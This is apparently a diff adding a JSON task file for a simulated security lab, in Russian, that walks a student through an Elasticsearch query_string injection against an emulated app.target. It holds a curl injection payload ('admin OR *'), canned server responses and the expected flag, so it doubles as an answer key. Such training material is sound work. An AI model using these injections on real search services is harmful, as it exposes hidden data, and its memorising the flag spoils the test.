@@ -1,0 +1,37 @@
+{
+  "id": "web-elasticsearch-injection",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{3l4st1c_dsl_qu3ry_1nj3ct}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: Elasticsearch DSL-инъекция\n\nGET /search?q= кладёт q в query_string. Обойди фильтр и вытащи скрытый документ.\n\n1. Обычный поиск:\n   curl -s 'https://app.target/search?q=phone'\n2. Оператор OR / wildcard:\n   curl -s 'https://app.target/search?q=admin OR *'\n3. В выдаче будет документ с секретом (флаг) — запиши его в found.txt и набери check.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция app.target/search)",
+      "cases": [
+        {
+          "match": "admin OR|OR \\*|q=\\*",
+          "example": "-s '.../search?q=admin OR *'",
+          "output": "{\"took\":5,\"hits\":{\"total\":{\"value\":4200},\"hits\":[{\"_source\":{\"name\":\"admin\",\"secret\":\"nto{3l4st1c_dsl_qu3ry_1nj3ct}\"}}]}}\n"
+        },
+        {
+          "match": "search",
+          "example": "-s '.../search?q=phone'",
+          "output": "{\"took\":3,\"hits\":{\"total\":{\"value\":12},\"hits\":[{\"_source\":{\"name\":\"phone\"}}]}}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только /search на app.target.\n"
+    }
+  }
+}
